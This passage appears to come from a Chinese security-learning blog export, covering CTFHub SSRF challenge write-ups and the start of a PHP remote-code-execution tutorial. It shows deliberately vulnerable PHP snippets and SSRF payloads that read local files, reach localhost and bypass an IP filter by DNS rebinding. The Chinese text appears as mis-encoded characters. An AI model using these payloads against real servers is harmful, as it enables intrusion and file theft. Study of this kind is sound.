class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/127|172|10|192/&quot;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker! Ban Intranet IP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>å°è¯•æŸ¥çœ‹flag.phpçš„æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¥½å¤šï¼Œæˆ‘ä»¬è¯•è¯•localhost</p><p>payloadæ„é€ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://localhost/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928102439317.png" alt="image-20230928102439317"></p><h4 id="5-DNSé‡ç»‘å®š"><a href="#5-DNSé‡ç»‘å®š" class="headerlink" title="5.DNSé‡ç»‘å®š"></a>5.DNSé‡ç»‘å®š</h4><h4 id="DNSé‡ç»‘å®š-Bypass"><a href="#DNSé‡ç»‘å®š-Bypass" class="headerlink" title="DNSé‡ç»‘å®š Bypass"></a>DNSé‡ç»‘å®š Bypass</h4><p><strong>é¢˜ç›®æè¿°</strong>ï¼šå…³é”®è¯ï¼šDNSé‡ç»‘å®šã€‚å‰©ä¸‹çš„è‡ªå·±æ¥å§ï¼Œä¹Ÿè®¸é™„ä»¶ä¸­çš„é“¾æ¥èƒ½æœ‰äº›å¸®åŠ©</p><blockquote><p>   DNSé‡ç»‘å®šDNS Rebindingæ”»å‡»åœ¨ç½‘é¡µæµè§ˆè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·åœ¨åœ°å€æ ä¸­è¾“å…¥åŒ…å«åŸŸåçš„ç½‘å€ã€‚æµè§ˆå™¨é€šè¿‡DNSæœåŠ¡å™¨å°†åŸŸåè§£æä¸ºIPåœ°å€ï¼Œç„¶åå‘å¯¹åº”çš„IPåœ°å€è¯·æ±‚èµ„æºï¼Œæœ€åå±•ç°ç»™ç”¨æˆ·ã€‚è€Œå¯¹äºåŸŸåæ‰€æœ‰è€…ï¼Œä»–å¯ä»¥è®¾ç½®åŸŸåæ‰€å¯¹åº”çš„IPåœ°å€ã€‚å½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼Œè§£æåŸŸåè·å–ä¸€ä¸ªIPåœ°å€ï¼›ç„¶åï¼ŒåŸŸåæŒæœ‰è€…ä¿®æ”¹å¯¹åº”çš„IPåœ°å€ï¼›ç”¨æˆ·å†æ¬¡è¯·æ±‚è¯¥åŸŸåï¼Œå°±ä¼šè·å–ä¸€ä¸ªæ–°çš„IPåœ°å€ã€‚å¯¹äºæµè§ˆå™¨æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹è®¿é—®çš„éƒ½æ˜¯åŒä¸€åŸŸåï¼Œæ‰€ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚è¿™å°±é€ æˆäº†DNS Rebindingæ”»å‡»ã€‚<br>â€ƒâ€ƒæ”¾åˆ°è¿™ä¸ªé¢˜ç›®çš„ç¯å¢ƒä¸Šæ¥çœ‹ï¼Œæˆ‘ä»¬ä½¿ç”¨å„ç§æ–¹æ³•æƒ³æ¥å®ç°ç»•è¿‡ï¼Œä½†æ˜¯éƒ½æ— æ³•è®¿é—®ï¼Œæ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬ä½¿ç”¨DNSé‡ç»‘å®šï¼Œä»DNSåŸŸåè§£æå…¥æ‰‹ï¼Œæœ‰ä¸€ä¸ªæƒ³æ³•å°±æ˜¯é€šè¿‡ä¿®è¯¥åŸŸåå¯¹åº”çš„IPï¼Œä½¿ä¸€ä¸ªåŸŸåå¯¹åº”ä¸¤ä¸ªIPï¼Œé‚£ä¹ˆåœ¨å¤šæ¬¡çš„è®¿é—®ä¹‹ä¸‹äº§ç”Ÿçš„è®¿é—®æ•ˆæœæ˜¯ä¸€æ ·çš„å®ç°IPç»•è¿‡ã€‚</p></blockquote><blockquote><p>ç®€å•å™è¿°ä¸€ä¸‹é€»è¾‘ï¼š</p><p>1.åˆ¤å®šä½ ç»™çš„ IP æˆ–è€…åŸŸåè§£æåçš„ IP æ˜¯å¦åœ¨é»‘åå•ä¸­<br>2.è‹¥åœ¨ï¼Œé€€å‡ºæŠ¥é”™<br>3.è‹¥ä¸åœ¨ï¼Œå†æ¬¡è®¿é—®ä½ ç»™çš„ IP æˆ–è€…åŸŸåè§£æåçš„ IPï¼›æ‰§è¡Œåç»­ä¸šåŠ¡æ¨¡å—</p><p>æ‰€ä»¥æ€è·¯å¾ˆç®€å•ï¼šä½ åªéœ€è¦æœ‰ä¸ªåŸŸåï¼Œä½†æ˜¯å®ƒæ˜ å°„ä¸¤ä¸ªIPï¼›åŒæ—¶è®¾ç½®TTLä¸º 0ï¼Œèƒ½æ–¹ä¾¿ä¸¤ä¸ª IP å³åˆ»åˆ‡æ¢ã€‚</p><p>æ•ˆæœç±»æ¯”ï¼šä½ è®¿é—®<code>wwfcww.xyz</code>è¿™ä¸ªåŸŸåï¼Œç¬¬ä¸€æ¬¡è§£æçš„ IP æ˜¯ 192.168.0.1ï¼›è€Œç¬¬äºŒæ¬¡è§£æçš„IPæ˜¯ 127.0.0.1ï¼Œå¦‚æ­¤ä¸€æ¥å³å¯è¿›è¡Œ SSRF æ”»å‡»ã€‚</p></blockquote><p>DNSé‡ç»‘å®šçš„é“¾æ¥ï¼š<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928104530758.png" alt="image-20230928104530758"></p><p>å…ˆæ‰“å¼€é¢˜ç›®</p><p>åˆ†åˆ«ç”¨fileåè®®æŸ¥çœ‹index.phpå’Œflag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/127|172|10|192/&quot;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker! Ban Intranet IP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ„é€ çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.c0a80002.rbndr.us/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230928110113084.png" alt="image-20230928110113084"></p><h2 id="08ssrfé˜²å¾¡"><a href="#08ssrfé˜²å¾¡" class="headerlink" title="08ssrfé˜²å¾¡"></a>08ssrfé˜²å¾¡</h2><blockquote><p>1.ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç¨‹æœåŠ¡å™¨ç«¯å£çŠ¶æ€</p><p>2.é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºHTTPå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚80,443,8080.8088ç­‰</p><p>3.è®¾ç½®ä¸€ä¸ªç™½åå•,å¹¶ä¸”å¦‚æœå¯¹æ–¹è¯»å–ç¯å›å£åœ°å€ç«‹é©¬ç»ˆæ­¢è¿è¡Œ</p><p>4.ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸HTTPå’ŒHTTPS</p></blockquote><p><strong>æ€»ç»“ï¼š</strong>å°±æ˜¯è¦å¤šæ€è€ƒï¼Œç†è§£æ¼æ´çš„æˆå› ï¼Œä¸€äº›ç»•è¿‡çš„æ–¹æ³•ï¼Œä¸€äº›åè®®çš„ç†è§£ï¼Œåè®®çš„ä½œç”¨ç­‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rceæ¼æ´å­¦ä¹ </title>
      <link href="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="rceæ¼æ´å­¦ä¹ "><a href="#rceæ¼æ´å­¦ä¹ " class="headerlink" title="rceæ¼æ´å­¦ä¹ "></a>rceæ¼æ´å­¦ä¹ </h1><h2 id="ä»£ç æ‰§è¡Œæ¼æ´"><a href="#ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="ä»£ç æ‰§è¡Œæ¼æ´"></a>ä»£ç æ‰§è¡Œæ¼æ´</h2><h3 id="ä»£ç æ‰§è¡Œæ¼æ´åŸç†ï¼š"><a href="#ä»£ç æ‰§è¡Œæ¼æ´åŸç†ï¼š" class="headerlink" title="ä»£ç æ‰§è¡Œæ¼æ´åŸç†ï¼š"></a>ä»£ç æ‰§è¡Œæ¼æ´åŸç†ï¼š</h3><p>ä¼ å…¥phpä»£ç åˆ°æ‰§è¡Œå‡½æ•°çš„å˜é‡ï¼Œå®¢æˆ·ç«¯å¯æ§ï¼Œå¹¶ä¸”æ²¡æœ‰ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥éšæ„è¾“å…¥è‡ªå·±æƒ³æ‰§è¡Œçš„ä»£ç ï¼Œå¹¶ä¸”è¿™äº›ä»£ç åœ¨æœåŠ¡ç«¯æ‰§è¡Œ</p><h3 id="ä»£ç æ‰§è¡Œæ¼æ´å±å®³ï¼š"><a href="#ä»£ç æ‰§è¡Œæ¼æ´å±å®³ï¼š" class="headerlink" title="ä»£ç æ‰§è¡Œæ¼æ´å±å®³ï¼š"></a>ä»£ç æ‰§è¡Œæ¼æ´å±å®³ï¼š</h3><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡RCEç»§æ‰¿webç”¨æˆ·çš„æƒé™ï¼Œæ‰§è¡Œphpä»£ç ï¼Œå¦‚æœwebçš„æƒé™æ¯”è¾ƒé«˜çš„è¯ï¼Œå°±å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨ä»»æ„æ–‡ä»¶çš„å†…å®¹ï¼Œç”šè‡³æ§åˆ¶æ•´ä¸ªç½‘ç«™</p><h3 id="ä»£ç æ‰§è¡Œçš„ä¸€äº›å‡½æ•°"><a href="#ä»£ç æ‰§è¡Œçš„ä¸€äº›å‡½æ•°" class="headerlink" title="ä»£ç æ‰§è¡Œçš„ä¸€äº›å‡½æ•°"></a>ä»£ç æ‰§è¡Œçš„ä¸€äº›å‡½æ•°</h3><h4 id="1-eval"><a href="#1-eval" class="headerlink" title="1.eval()"></a>1.eval()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†$cmdä¸­çš„ä»£ç ï¼Œ<code>æ‰“å°åˆ°ä¸‹ä¸€è¡Œå½“åšå½“å‰phpæ–‡ä»¶ä¸­çš„ä¸€æ®µä»£ç æ‰§è¡Œ</code></p><p>æ‰€ä»¥$cmdä¸€èˆ¬éœ€è¦ä»¥<code>;</code>ç»“å°¾ï¼Œä½œä¸ºä¸€ä¸ªå®Œæ•´çš„phpä»£ç æŒ‡ä»¤</p><p>ä¾‹å¦‚ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd=system(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><h2 id="å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´</h2><h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†ï¼š"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†ï¼š" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†ï¼š"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†ï¼š</h3><p>åº”ç”¨åœ¨è°ƒç”¨è¿™äº›å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ—¶å€™ï¼Œå¦‚æœå°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°å‘½ä»¤è¡Œä¸­ï¼Œå¦‚æœæ²¡å¯¹ç”¨æˆ·çš„è¾“å…¥æ³•è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œå°±ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´å±å®³ï¼š"><a href="#å‘½ä»¤æ‰§è¡Œæ¼æ´å±å®³ï¼š" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ¼æ´å±å®³ï¼š"></a>å‘½ä»¤æ‰§è¡Œæ¼æ´å±å®³ï¼š</h3><blockquote><p>1.ç»§æ‰¿webæœåŠ¡å™¨ç¨‹åºæƒé™ï¼Œå»æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>2.ç»§æ‰¿webæœåŠ¡å™¨æƒé™ï¼Œè¯»å–æ–‡ä»¶</p><p>3.åå¼¹shell</p><p>4.æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œæ§åˆ¶æ•´ä¸ªæœåŠ¡å™¨</p></blockquote><h3 id="å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å‡½æ•°</h3><h4 id="1-system"><a href="#1-system" class="headerlink" title="1.system()"></a>1.system()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>$_GET</code>æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„phpè¶…å…¨å±€å˜é‡ï¼Œå®ƒç”¨äºæ”¶é›†æ¥è‡ªurlçš„å€¼ã€‚ä»urlå‚æ•°ä¸­è·å–åä¸º<code>â€œbenbenâ€</code>çš„å‚æ•°å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨<code>$cmd</code>å˜é‡ä¸­ï¼Œ</p><p><code>isset</code>å‡½æ•°æ£€æŸ¥<code>$cmd</code>å˜é‡æ˜¯å¦å·²è®¾ç½®ä¸”ä¸ä¸ºnullã€‚å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œåˆ™æ‰§è¡Œ <code>system($cmd)</code> è¯­å¥ã€‚è¿™å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ <code>$cmd</code> å˜é‡ä¸­æŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤ã€‚</p></blockquote><p><strong>è¿™æ®µä»£ç å­˜åœ¨çš„å®‰å…¨é£é™©æ˜¯å®ƒå…è®¸ç”¨æˆ·é€šè¿‡urlå‚æ•°æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</strong></p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816093929988.png" alt="image-20230816093929988"></p><h4 id="2-exec"><a href="#2-exec" class="headerlink" title="2.exec()"></a>2.exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>å‚æ•°</p><p>exec(a,b,c)</p><p>æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°aæ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç¬¬äºŒä¸ªå‚æ•°bï¼Œä¸ºå­˜å‚¨æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œç»“æœçš„ä¸€ä¸ªæ•°ç»„ï¼Œç›¸å½“äºä¸€ä¸ªè½½ä½“ã€‚</p><p>cå‚æ•°äºå‘½ä»¤æ‰§è¡Œæ— å…³ã€‚</p></li><li><p>å›æ˜¾</p><p>æœ¬èº«å¯ä»¥å›æ˜¾ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æ²¡æœ‰è®¾ç½®ç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œå­˜å‚¨çš„è¯ï¼Œå®ƒåªä¼šå›æ˜¾æœ€åä¸€ä½çš„ç»“æœï¼Œæ‰€ä»¥å°†å‚æ•°å­˜å‚¨ä¹‹åå°±å¯ä»¥é€šè¿‡print_rä¹‹ç±»å°†å‡½æ•°æ‰“å°å‡ºæ¥ã€‚</p></li></ul><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816105719961.png" alt="image-20230816105719961"></p><h4 id="3-shell-exec"><a href="#3-shell-exec" class="headerlink" title="3.shell_exec"></a>3.shell_exec</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>å‚æ•°</p><p>ä¸€ä¸ªæ‰§è¡Œçš„å‘½ä»¤</p></li><li><p>å›æ˜¾</p><p>ä¸èƒ½è‡ªåŠ¨å›æ˜¾ï¼Œéœ€è¦æ‰“å°å‡½æ•°å¸®åŠ©è¾“å‡º</p><blockquote><p>ä»urlä¸­è·å–å‚æ•°å€¼ï¼Œå¹¶å­˜å‚¨åœ¨<code>$cmd</code>å˜é‡ä¸­ï¼Œä½¿ç”¨shell_exec()å‡½æ•°æ‰§è¡Œ$cmdå˜é‡ä¸­çš„å‘½ä»¤ï¼Œæ¯”å¹¶å°†ç»“æœå­˜å‚¨åœ¨<code>$output</code>å˜é‡ä¸­ï¼Œç”¨echoæ‰“å°<code>$output</code>å†…å®¹ã€‚</p><p>calc:å¼¹è®¡ç®—å™¨å‘½ä»¤</p></blockquote></li></ul><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816163337507.png" alt="image-20230816163337507"></p><h4 id="4-åå¼•å·"><a href="#4-åå¼•å·" class="headerlink" title="4.``åå¼•å·"></a>4.``åå¼•å·</h4><p>åœ¨æ— å­—æ¯ï¼Œæ— æ•°å­—çš„å›æ˜¾ä¸­ä½¿ç”¨æå¤š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$cmd</span>`,PHP_EOL;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>å‚æ•°</p><p>ä¸€ä¸ªï¼Œæ‰§è¡ŒæŒ‡ä»¤</p></li><li><p>å›æ˜¾</p><p>ä¸èƒ½å›æ˜¾ï¼Œéœ€è¦å¸®åŠ©</p><blockquote><p>åå¼•å·è¿ç®—ç¬¦é‡Œé¢çš„å˜é‡ä¼šè¢«å½“åšå‘½ä»¤æ‰§è¡Œã€‚åå¼•å·è¿ç®—ç¬¦ï¼ˆä¹Ÿç§°ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼‰ç”¨äºæ‰§è¡Œ <code>$cmd</code> å˜é‡ä¸­æŒ‡å®šçš„å‘½ä»¤ï¼Œå¹¶å°†ç»“æœä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚</p><p><code>PHP_EOL</code> æ˜¯ä¸€ä¸ªé¢„å®šä¹‰å¸¸é‡ï¼Œå®ƒè¡¨ç¤ºå½“å‰ç³»ç»Ÿä¸­çš„æ¢è¡Œç¬¦ã€‚</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230816211321163.png" alt="image-20230816211321163"></p></li></ul><h4 id="5-popen"><a href="#5-popen" class="headerlink" title="5.popen()"></a>5.popen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ben</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$ben</span>))&#123;</span><br><span class="line">      <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><p>æ‰§è¡Œ</p></li><li><p>popençš„æ‰§è¡Œéœ€è¦å•ç‹¬æ‹‰å‡ºæ¥ï¼Œå› 